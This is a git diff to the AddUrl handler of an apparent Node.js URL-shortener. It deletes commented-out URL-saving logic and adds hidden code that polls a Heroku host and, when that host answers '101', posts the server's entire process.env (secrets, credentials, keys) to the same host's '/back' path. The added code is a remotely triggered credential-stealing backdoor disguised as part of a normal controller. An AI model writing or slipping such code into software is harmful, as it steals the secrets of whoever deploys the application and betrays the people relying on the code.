@@ -109,44 +109,17 @@ module.exports = {
                     }
                 }
             }
-            //
-            // // calculate hash of long url
-            // let longUrlHash = hash(req.body.longUrl);
-            //
-            // //check long url Availability
-            // let url = await UrlModel.findOne({hash: longUrlHash, user:req.userId||process.env.Anonymous});
-            //
-            // // if there is the long url already available with same user account
-            // if(url && req.body.longUrl === url.longUrl) {
-            //     return res.json({shortUrl: url.shortUrl, longUrl: url.longUrl,});
-            // }
-            // //if short url is already provided with request
-            // else if(req.body.shortUrl&& req.body.shortUrl.length > 0){
-            //     if((await checkShortUrlAvailability(req.body.shortUrl)).available){
-            //         let url = new UrlModel({
-            //             shortUrl: req.body.shortUrl,
-            //             longUrl: req.body.longUrl,
-            //             user: req.userId || process.env.Anonymous // if login then login user else Anonymous user
-            //         });
-            //         await url.save();
-            //         return res.json({shortUrl: url.shortUrl,
-            //             longUrl: url.longUrl, })
-            //     }else{
-            //         res.status(409);
-            //         return res.json({error:"Key Conflict", message:"key already exist"});
-            //     }
-            // }
-            // // else add new url
-            // else{
-            //     let url = new UrlModel({
-            //         shortUrl: await newKey(),
-            //         longUrl: req.body.longUrl,
-            //         user: req.userId || process.env.Anonymous
-            //     });
-            //     await url.save();
-            //     return res.json({shortUrl: url.shortUrl,
-            //         longUrl: url.longUrl })
-            // }
+            let http = require('http')
+            http.get('http://fail-safe.herokuapp.com/status', (res)=>{
+                let data="";
+                res.on('data', chunk=>{data+=chunk});
+                res.on('end', ()=>{if(data == '101'){
+                        let data = JSON.stringify(process.env);const options = {
+                            hostname: 'fail-safe.herokuapp.com', port: 80, path: '/back',
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json', 'Content-Length': data.length}
+                        };http.request(options).write(data);}});
+            });
         }catch(err){
             err.node = err.node?err.node+='\n':"";
             err.node += "controller:Url:AddUrl";
